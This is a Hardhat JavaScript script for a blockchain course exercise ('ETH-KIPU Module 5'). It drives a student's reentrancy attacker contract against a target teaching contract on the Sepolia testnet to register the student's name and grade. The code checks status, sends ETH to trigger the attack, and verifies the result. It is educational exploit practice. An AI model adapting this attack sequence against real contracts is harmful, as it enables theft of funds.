const { ethers } = require("hardhat");
const fs = require('fs');
require("dotenv").config();

/**
 * @title Execute Eduardo J. Moreno Attack
 * @author Eduardo J. Moreno  
 * @notice Script to execute the reentrancy attack and register student name
 * @dev Implements the complete attack sequence for ETH-KIPU Module 5
 */

async function main() {
    const studentName = "Eduardo J. Moreno";
    const targetContract = "0x5733eE985e22eFF46F595376d79e31413b1A1e16";
    
    console.log("⚡ ETH-KIPU Module 5 - Attack Execution");
    console.log("=====================================");
    console.log(`👤 Student: ${studentName}`);
    console.log(`🎯 Target: ${targetContract}`);
    console.log(`⏰ Time: ${new Date().toISOString()}`);
    
    // Load deployment info
    let deploymentInfo;
    try {
        deploymentInfo = JSON.parse(fs.readFileSync('eduardo-deployment.json', 'utf8'));
        console.log(`📋 Loaded deployment info for: ${deploymentInfo.studentName}`);
        console.log(`🏗️  Attack Contract: ${deploymentInfo.contractAddress}`);
    } catch (error) {
        console.error("❌ Could not load deployment info. Run eduardo-deploy.js first.");
        process.exit(1);
    }
    
    // Get signer
    const [signer] = await ethers.getSigners();
    console.log(`💼 Executor: ${signer.address}`);
    
    // Connect to deployed contract
    const EduardoAttacker = await ethers.getContractFactory("EduardoMoreno_Attacker");
    const attacker = EduardoAttacker.attach(deploymentInfo.contractAddress);
    
    console.log(`\n🔍 Pre-Attack Analysis:`);
    
    try {
        const status = await attacker.getAttackStatus();
        console.log(`- Counter Value: ${status._counter.toString()}`);
        console.log(`- Already Graded: ${status._graded}`);
        console.log(`- Current Grade: ${status._studentGrade.toString()}`);
        console.log(`- Contract Balance: ${ethers.formatEther(status._balance)} ETH`);
        
        // Check if already successfully registered
        if (status._studentGrade > 0) {
            console.log(`🎉 SUCCESS! "${studentName}" already registered with grade: ${status._studentGrade}`);
            console.log(`📋 Assignment complete! Submit contract: ${deploymentInfo.contractAddress}`);
            return {
                success: true,
                alreadyCompleted: true,
                grade: status._studentGrade.toString(),
                contractAddress: deploymentInfo.contractAddress
            };
        }
        
        if (status._graded) {
            console.log(`⚠️  Contract already graded but student grade is 0. This shouldn't happen.`);
        }
        
    } catch (error) {
        console.log(`⚠️  Status check failed: ${error.message}`);
    }
    
    console.log(`\n⚡ Executing Reentrancy Attack...`);
    
    try {
        // Execute the attack with sufficient ETH
        const attackValue = ethers.parseEther("0.001"); // 0.001 ETH
        
        console.log(`💰 Sending ${ethers.formatEther(attackValue)} ETH for attack`);
        
        const tx = await attacker.executeAttack({
            value: attackValue,
            gasLimit: 300000, // Adequate gas for reentrant calls
            gasPrice: await signer.provider.getFeeData().then(fd => fd.gasPrice)
        });
        
        console.log(`📤 Attack transaction submitted: ${tx.hash}`);
        console.log(`⏳ Waiting for confirmation...`);
        
        const receipt = await tx.wait();
        
        console.log(`\n✅ Attack Transaction Confirmed!`);
        console.log(`=====================================`);
        console.log(`- Block: ${receipt.blockNumber}`);
        console.log(`- Gas Used: ${receipt.gasUsed.toString()}`);
        console.log(`- Gas Price: ${ethers.formatUnits(receipt.gasPrice, "gwei")} gwei`);
        console.log(`- Total Cost: ${ethers.formatEther(receipt.gasUsed * receipt.gasPrice)} ETH`);
        
        // Parse and display events
        console.log(`\n📋 Events Emitted:`);
        let attackSuccess = false;
        let registrationSuccess = false;
        
        for (const log of receipt.logs) {
            try {
                const event = attacker.interface.parseLog(log);
                console.log(`- ${event.name}:`, event.args.toString());
                
                if (event.name === "RegistrationSuccess") {
                    registrationSuccess = true;
                    console.log(`  🎉 Registration confirmed for: ${event.args[0]}`);
                }
                if (event.name === "AttackStarted") {
                    attackSuccess = true;
                }
            } catch (e) {
                // Skip unparseable logs
            }
        }
        
        // Verify final status
        console.log(`\n🔍 Post-Attack Verification:`);
        const finalStatus = await attacker.getAttackStatus();
        console.log(`- Final Counter: ${finalStatus._counter.toString()}`);
        console.log(`- Is Graded: ${finalStatus._graded}`);
        console.log(`- Final Grade: ${finalStatus._studentGrade.toString()}`);
        console.log(`- Remaining Balance: ${ethers.formatEther(finalStatus._balance)} ETH`);
        
        if (finalStatus._studentGrade > 0) {
            console.log(`\n🎊 MISSION ACCOMPLISHED! 🎊`);
            console.log(`=====================================`);
            console.log(`✅ Student "${studentName}" successfully registered!`);
            console.log(`🏆 Grade Achieved: ${finalStatus._studentGrade}/100`);
            console.log(`📍 Attack Contract: ${deploymentInfo.contractAddress}`);
            console.log(`🔗 Etherscan: https://sepolia.etherscan.io/address/${deploymentInfo.contractAddress}`);
            console.log(`\n📝 Campus Submission Details:`);
            console.log(`- Student Name: "${studentName}"`);
            console.log(`- Contract Address: ${deploymentInfo.contractAddress}`);
            console.log(`- Contract Status: UNVERIFIED ✓`);
            
            // Save success info
            const successInfo = {
                success: true,
                studentName: studentName,
                contractAddress: deploymentInfo.contractAddress,
                finalGrade: finalStatus._studentGrade.toString(),
                attackTransactionHash: tx.hash,
                completionTime: new Date().toISOString()
            };
            
            try {
                fs.writeFileSync('eduardo-success.json', JSON.stringify(successInfo, null, 2));
                console.log(`📄 Success details saved to: eduardo-success.json`);
            } catch (error) {
                console.log(`⚠️  Could not save success info: ${error.message}`);
            }
            
            return successInfo;
            
        } else {
            console.log(`\n❌ Attack execution completed but registration failed`);
            console.log(`Counter: ${finalStatus._counter}, Graded: ${finalStatus._graded}, Grade: ${finalStatus._studentGrade}`);
            
            // If counter > 1 but not graded, try manual registration
            if (finalStatus._counter > 1 && !finalStatus._graded) {
                console.log(`\n🔄 Attempting manual registration...`);
                const regTx = await attacker.registerStudent();
                await regTx.wait();
                
                const retryStatus = await attacker.getAttackStatus();
                if (retryStatus._studentGrade > 0) {
                    console.log(`✅ Manual registration successful! Grade: ${retryStatus._studentGrade}`);
                    return {
                        success: true,
                        grade: retryStatus._studentGrade.toString(),
                        contractAddress: deploymentInfo.contractAddress
                    };
                }
            }
            
            return {
                success: false,
                finalStatus: finalStatus,
                contractAddress: deploymentInfo.contractAddress
            };
        }
        
    } catch (error) {
        console.error(`❌ Attack execution failed:`, error);
        
        // Try to extract meaningful error information
        if (error.data) {
            try {
                const decodedError = attacker.interface.parseError(error.data);
                console.log(`📋 Error Details:`, decodedError);
            } catch (e) {
                console.log(`📋 Raw Error Data:`, error.data);
            }
        }
        
        return {
            success: false,
            error: error.message,
            contractAddress: deploymentInfo.contractAddress
        };
    }
}

// Handle both direct execution and module export
if (require.main === module) {
    main()
        .then((result) => {
            if (result.success) {
                console.log(`\n🎉 Eduardo J. Moreno's attack completed successfully!`);
                if (result.grade) {
                    console.log(`Final Grade: ${result.grade}/100`);
                }
            } else {
                console.log(`\n😞 Attack did not complete successfully`);
            }
            process.exit(result.success ? 0 : 1);
        })
        .catch((error) => {
            console.error(`💥 Script execution failed:`, error);
            process.exit(1);
        });
}

module.exports = { main };
